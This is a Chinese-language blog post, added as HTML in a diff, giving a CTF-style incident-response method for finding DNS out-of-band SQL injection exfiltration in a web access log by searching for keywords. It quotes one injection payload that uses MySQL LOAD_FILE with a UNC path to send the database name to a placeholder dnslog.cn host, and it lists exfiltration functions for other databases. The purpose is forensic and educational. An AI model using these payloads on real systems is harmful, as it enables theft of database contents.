@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DNS外带SQL注入解题思路 · pressure-J</title>
+<meta name="description" content="这类题目一般描述中会给几个关键词：">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/dns-wai-dai-sql-zhu-ru-jie-ti-si-lu.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="DNS外带SQL注入解题思路 · pressure-J">
+<meta property="og:description" content="这类题目一般描述中会给几个关键词：">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/ir.html">应急响应</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>DNS外带SQL注入解题思路</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-ir">应急响应</span>
+          <time datetime="2026-07-08">2026-07-08</time>
+          <span>1776 字</span>
+          <span>约 5 分钟</span>
+        </div>
+        <div class="chips post-tags"><span class="chip">SQL注入</span><span class="chip">DNS</span><span class="chip">OOB</span><span class="chip">解题思路</span></div>
+      </header>
+      <div class="content"><h2 id="_1">题目特征识别</h2>
+<p>这类题目一般描述中会给几个关键词：<br />
+- "异常的 DNS 查询记录"<br />
+- "绕过检测将数据外传"<br />
+- "数据库敏感信息外传"</p>
+<p><strong>看到这些词，直接锁定 → DNS OOB 外带数据（Out-Off-Band Data Exfiltration）</strong></p>
+<hr />
+<h2 id="_2">核心思路：三步定位法</h2>
+<h3 id="step-1">Step 1：缩小范围，不读全文</h3>
+<p>access.log 文件很大（本例 43000+ 行），你不需要逐行读。直接搜索关键词：</p>
+<p><strong>① 搜索 DNS 外传的典型函数：</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>load_file
+LOAD_FILE
+</code></pre></div></div>
+
+<p>这是 MySQL DNS 外传的核心函数，通过 UNC 路径触发 DNS 查询。</p>
+<p><strong>② 搜索常见 DNS 日志平台域名：</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>dnslog
+ceye
+burpcollaborator
+interactsh
+</code></pre></div></div>
+
+<p>攻击者常用的 DNS Log 平台，用来接收 DNS 请求记录。</p>
+<p><strong>③ 搜索 UNC 路径特征：</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>%5C%5C   （URL编码的双反斜杠 \\）
+\\\\     （原始日志中的双反斜杠）
+</code></pre></div></div>
+
+<p><strong>④ 如果你在 Windows 环境用工具：</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code># 在 Wireshark/终端模拟器 中
+Ctrl+F → 搜索 load_file
+
+# 或者用命令行（不打开文件）
+findstr /I "load_file dnslog ceye" access.log
+
+# Linux/Mac
+grep -i "load_file\|dnslog\|ceye" access.log
+</code></pre></div></div>
+
+<blockquote>
+<p><strong>关键技巧</strong>：不要读全文，不要从头翻，直接搜索这几个关键词就能定位到关键行。</p>
+</blockquote>
+<hr />
+<h3 id="step-2">Step 2：定位到关键行后提取域名</h3>
+<p>找到类似这样的行：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>203.0.113.88 [14:02:30] GET /search?q=1' AND (SELECT load_file(concat('\\\\',
+(select database()),'.XXXXXXX.dnslog.cn\\abc'))) --
+</code></pre></div></div>
+
+<p><strong>从中提取接收域名</strong>：<code>XXXXXXX.dnslog.cn</code></p>
+<p>这条 SQL 的意思是：<br />
+- <code>LOAD_FILE('\\数据库名.XXXXXXX.dnslog.cn\abc')</code><br />
+- MySQL 试图读取这个 UNC 路径时，会向 XXXXXXX.dnslog.cn 发 DNS 查询<br />
+- 数据库名被携带在子域名中，攻击者的 DNS 服务器收到查询就拿到了数据</p>
+<hr />
+<h3 id="step-3">Step 3：确认答案</h3>
+<p><strong>接收数据的域名</strong> = <code>XXXXXXX.dnslog.cn</code></p>
+<hr />
+<h2 id="_3">如果不能直接搜到关键词怎么办？</h2>
+<p>如果搜 <code>load_file</code> 没结果，说明攻击者用了其他 OOB 技术，换思路：</p>
+<h3 id="dns">不同数据库的 DNS 外传函数</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>DNS 外传函数</th>
+<th>搜索关键词</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>MySQL</strong></td>
+<td><code>LOAD_FILE()</code></td>
+<td><code>load_file</code></td>
+</tr>
+<tr>
+<td><strong>SQL Server</strong></td>
+<td><code>xp_dirtree</code> <code>xp_fileexist</code></td>
+<td><code>xp_dirtree</code></td>
+</tr>
+<tr>
+<td><strong>Oracle</strong></td>
+<td><code>UTL_HTTP</code> <code>UTL_INADDR</code></td>
+<td><code>utl_http</code></td>
+</tr>
+<tr>
+<td><strong>PostgreSQL</strong></td>
+<td><code>COPY</code> + <code>dblink</code></td>
+<td><code>dblink_connect</code></td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="payload">不同工具的 payload 特征</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>DNS 域名特征</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>sqlmap</strong></td>
+<td>默认使用 <code>burpcollaborator</code> 或随机域名</td>
+</tr>
+<tr>
+<td><strong>手工/其他工具</strong></td>
+<td>常用 <code>dnslog.cn</code> <code>ceye.io</code> <code>interactsh</code></td>
+</tr>
+<tr>
+<td><strong>自定义</strong></td>
+<td>攻击者自己的域名</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="_4">实在搜不到怎么办？</h3>
+<p>先找 SQL 注入点 → 看哪个参数被注入 → 在注入点附近找包含 <code>.com</code> <code>.cn</code> <code>.io</code> 等域名的行</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>grep -i "\.com\|\.cn\|\.io" access.log | grep "?"
+</code></pre></div></div>
+
+<hr />
+<h2 id="_5">方法论总结</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>1. 识别题型 → DNS外带/OOB → 搜 load_file / dnslog / %5C%5C
+                        ↓
+                 找到了 → 提取域名 → 完成
+                        ↓
+                 没找到 → 换关键词
+                        ↓
+                  搜 xp_dirtree / utl_http / 域名特征
+                        ↓
+                 还是没找到 → 先找 SQL注入点，再在注入点附近搜域名
+</code></pre></div></div>
+
+<p><strong>核心原则</strong>：<br />
+- 不要从头读大文件，用搜索<br />
+- 用关键词缩小范围后再看上下文<br />
+- 根据数据库类型选不同的搜索词</p></div>
+      <div class="post-nav"><a class="pn-item prev" href="linux-log-analysis-basics.html"><span>← 上一篇</span><strong>Linux日志分析基础</strong></a><a class="pn-item next" href="sql-zhu-ru-dns-wai-dai-shu-ju-writeup.html"><span>下一篇 →</span><strong>SQL注入DNS外带数据WriteUp</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">题目特征识别</a><a href="#_2" class="toc-lv2">核心思路：三步定位法</a><a href="#step-1" class="toc-lv3">Step 1：缩小范围，不读全文</a><a href="#step-2" class="toc-lv3">Step 2：定位到关键行后提取域名</a><a href="#step-3" class="toc-lv3">Step 3：确认答案</a><a href="#_3" class="toc-lv2">如果不能直接搜到关键词怎么办？</a><a href="#dns" class="toc-lv3">不同数据库的 DNS 外传函数</a><a href="#payload" class="toc-lv3">不同工具的 payload 特征</a><a href="#_4" class="toc-lv3">实在搜不到怎么办？</a><a href="#_5" class="toc-lv2">方法论总结</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
